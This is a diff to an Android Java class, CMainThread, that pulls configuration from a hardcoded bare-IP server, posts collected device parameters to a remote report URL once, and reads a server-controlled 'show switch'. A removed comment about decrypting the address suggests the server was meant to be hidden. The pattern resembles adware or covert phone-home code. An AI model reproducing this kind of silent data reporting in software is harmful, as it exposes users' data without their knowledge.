@@ -12,13 +12,12 @@ public class CMainThread extends Thread {
 	private static String tag = CMainThread.class.getName();
 	private Context mContext = null;
 	public static CMainThread mInstance = null;
-
 	public static CMainThread getFlexThreadInstance(Context ctx){
 		if(mInstance == null)
 			mInstance = new CMainThread(ctx);
 		return mInstance;
 	}
-	private  CMainThread(Context context){
+	public  CMainThread(Context context){
 		mContext = context;
 	}
 	public void run(){
@@ -29,7 +28,6 @@ public class CMainThread extends Thread {
 		
 		CFuncMod fm = CFuncMod.getCmInstance();
 		String address = "http://120.26.39.236/fx/php/main.php?q=1";
-		//String address = fm.decryptString("");
 		String gData = fm.GetConfigFileContent(address);
 		if(gData == null || gData.isEmpty() == true){
 			return;
@@ -47,14 +45,17 @@ public class CMainThread extends Thread {
 		CLogU.Log(tag, params);
 		
 		if(fm.NetWorkActivity(mContext) == false){
-			fm.setSendState(mContext, 0,params);
 			return;
 		}
 		String dataReportUrl = fm.getDatasFromCached(mContext, CDataDef.KEY_URL_RES_DATA_REPORT);
-		CLogU.Log(tag, dataReportUrl);
+		if(fm.getSendState(mContext,CDataDef.KEY_DATA_SEND_STATE,false) == true){
+			CLogU.Log(tag, "has send");
+			return;
+		}
 		if(fm.sendPost(dataReportUrl, params) == false){
 			return;
 		}
+		fm.setSendState(mContext, CDataDef.KEY_DATA_SEND_STATE, true);
 		String value = fm.getDatasFromCached(mContext, CDataDef.KEY_GLOBALE_SHOW_SWITCH);
 		if(value.equals("false") == true){
 			return;
